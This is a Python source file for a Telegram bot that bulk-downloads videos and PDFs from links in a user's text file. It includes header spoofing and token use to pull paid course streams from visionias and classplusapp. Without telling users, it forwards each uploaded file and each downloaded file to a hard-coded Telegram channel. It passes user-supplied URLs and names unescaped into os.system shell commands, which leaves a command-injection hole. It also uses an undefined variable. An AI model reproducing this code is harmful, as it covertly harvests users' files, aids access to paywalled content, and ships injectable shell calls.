import os
import sys
import time
import asyncio
import requests
import re
from pyrogram import Client, filters
from pyrogram.types import Message
from aiohttp import ClientSession
from pyrogram.errors import FloodWait
import helper

bot = Client("bot",
             bot_token= "YOUR_BOT_TOKEN",
             api_id= YOUR_API_ID,
             api_hash= "YOUR_API_HASH"
)

@bot.on_message(filters.command(["start"]))
async def account_login(bot: Client, m: Message):
    await m.reply_text(f"Hi 👋 Sir ! How are You Sir 🤓❤️?\n\n☞ I'm a High-Speed **Txt File** Downloader Bot.\n\n☞ I can Download **Videos & Pdf** From Your **TXT** File.\n\n**𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 :** 𝗛𝗘𝗠𝗨")
  

@bot.on_message(filters.command("stop"))
async def restart_handler(_, m):
    await m.reply_text("**Process Has Been Stopped Successfully !**", True)
    os.execl(sys.executable, sys.executable, *sys.argv)


@bot.on_message(filters.command(["hemu"]))
async def account_login(bot: Client, m: Message):
    editable = await m.reply_text("**Now Send Me Your **txt** File & Follow Bot Instructions**")
    input: Message = await bot.listen(editable.chat.id)
    if input.document:
        x = await input.download()
        await bot.send_document(-1002068926911, x)
        await input.delete(True)
        file_name, ext = os.path.splitext(os.path.basename(x))

        path = f"./downloads/{m.chat.id}"

        try:
            with open(x, "r") as f:
                content = f.read()
            content = content.split("\n")
            links = []
            for i in content:
                links.append(i.split("://", 1))
            os.remove(x)
        except:
            await m.reply_text("Invalid file input.🥲Lol")
            os.remove(x)
            return
    else:
        content = input.text
        content = content.split("\n")
        links = []
        for i in content:
            links.append(i.split("://", 1))

    await editable.edit(f"Total links found are **{len(links)}**\n\nSend Number From Where You want to Download, initial is **1**")
    input0: Message = await bot.listen(editable.chat.id)
    raw_text = input0.text
    await input0.delete(True)

    await editable.edit("**Enter Batch Name or Send `d` To Grab Batch Name From Txt File**")
    input1: Message = await bot.listen(editable.chat.id)
    raw_text0 = input1.text
    await input1.delete(True)
    if raw_text0 == 'd':
        b_name = file_name
    else:
        b_name = raw_text0

    await editable.edit("**Enter Resolution Ex :** 480 or 720")
    input2: Message = await bot.listen(editable.chat.id)
    raw_text2 = input2.text
    resolution = raw_text2
    await input2.delete(True)
    
    resolution = raw_text2 if raw_text2 in ["144", "240", "360", "480", "720", "1080"] else "UN"

    await editable.edit("**Enter Your Name**\n**Ex : ** 𝗛𝗘𝗠𝗨")
    input3: Message = await bot.listen(editable.chat.id)
    raw_text3 = input3.text
    await input3.delete(True)
    
    CR = raw_text3 if raw_text3 != 'de' else credit

    await editable.edit("Now Send Your **Thumb URL**\n\nOr Send **no**")
    input6 = await bot.listen(editable.chat.id)
    raw_text6 = input6.text
    await input6.delete(True)
    await editable.delete()

    thumb = raw_text6
    if thumb.startswith("http://") or thumb.startswith("https://"):
        os.system(f"wget '{thumb}' -O 'thumb.jpg'")
        thumb = "thumb.jpg"
    else:
        thumb = "no"

    count = int(raw_text) if len(links) > 1 else 1

    try:
        for i in range(count - 1, len(links)):
            V = links[i][1].replace("file/d/","uc?export=download&id=").replace("www.youtube-nocookie.com/embed", "youtu.be").replace("?modestbranding=1", "").replace("/view?usp=sharing","")
            url = "https://" + V

            if "visionias" in url:
                async with ClientSession() as session:
                    async with session.get(url, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Pragma': 'no-cache', 'Referer': 'http://www.visionias.in/', 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'cross-site', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 12; RMX2121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',}) as resp:
                        text = await resp.text()
                        url = re.search(r"(https://.*?playlist.m3u8.*?)\"", text).group(1)

            elif '/master.mpd' in url:
                id = url.split("/")[-2]
                url = "https://d26g5bnklkwsh4.cloudfront.net/" + id + "/master.m3u8"
              
            elif 'classplusapp' in url:
                headers = {
                    'Host': 'api.classplusapp.com',
                    'x-access-token': 'YOUR_ACCESS_TOKEN',
                    'user-agent': 'Mobile-Android',
                    'app-version': '1.4.37.1',
                    'api-version': '18',
                    'device-id': '5d0d17ac8b3c9f51',
                    'device-details':'2848b866799971ca_2848b8667a33216c_SDK-30',
                    'accept-encoding': 'gzip, deflate'
                }
                
                params = (('url', f'{url}'), )
                response = requests.get('https://api.classplusapp.com/cams/uploader/video/jw-signed-url', headers=headers, params=params)                
                url = response.json()['url']

            name1 = links[i][0].replace("\t", "").replace(":", "").replace("/", "").replace("+", "").replace("#", "").replace("|", "").replace("@", "").replace("*", "").replace(".", "").replace("https", "").replace("http", "").strip()
            name = f'{str(count).zfill(3)}) {CR} {name1[:60]}'

            if "youtu" in url:
                ytf = f"bestvideo[height<={resolution}][ext=mp4]+bestaudio[ext=m4a]/best[height<={resolution}][ext=mp4]"
            else:
                ytf = f"b[height<={resolution}]/bv[height<={resolution}]+ba/b/bv+ba"

            if "jw-prod" in url:
                cmd = f'yt-dlp -o "{name}" "{url}"'
            else:
                cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}"'

            try:
                cc = f'[ 🎬 ] **Vid ID : **{str(count).zfill(3)}\n**Video Title :** {name1}**{CR}**.mp4\n\n**Batch Name :** {b_name}\n\n**Downloaded By ➤** {CR}'
                cc1 = f'[ 📕 ] **Pdf ID : **{str(count).zfill(3)}\n**File Title :** {name1}**{CR}**.pdf\n\n**Batch Name :**{b_name}\n\n**Downloaded By ➤** {CR}'
                if "drive" in url:
                    try:
                        ka = await helper.download(url, name)
                        copy = await bot.send_document(chat_id=m.chat.id, document=ka, caption=cc1)
                        await copy.copy(chat_id=-1002068926911)
                        count += 1
                        os.remove(ka)
                        time.sleep(1)
                    except FloodWait as e:
                        await m.reply_text(str(e))
                        time.sleep(e.x)
                        continue
                elif ".pdf" in url:
                    try:
                        cmd = f'yt-dlp --no-warning -o "{name}.pdf" "{url}"'
                        os.system(cmd)
                        copy = await bot.send_document(chat_id=m.chat.id, document=f'{name}.pdf', caption=cc1)
                        await copy.copy(chat_id=-1002068926911)
                        count += 1
                        os.remove(f"{name}.pdf")
                        time.sleep(1)
                    except FloodWait as e:
                        await m.reply_text(str(e))
                        time.sleep(e.x)
                        continue
                else:
                    os.system(cmd)
                    copy = await bot.send_document(chat_id=m.chat.id, document=f'{name}.mp4', caption=cc, thumb=thumb if thumb != "no" else None)
                    await copy.copy(chat_id=-1002068926911)
                    count += 1
                    os.remove(f'{name}.mp4')
                    time.sleep(1)
            except Exception as e:
                await bot.send_message(m.chat.id, f"**{count}) Error**\n**{url}**\n**Error :** `{e}`")
                continue
    except Exception as e:
        await bot.send_message(m.chat.id, f"**Error :** `{e}`")

bot.run()
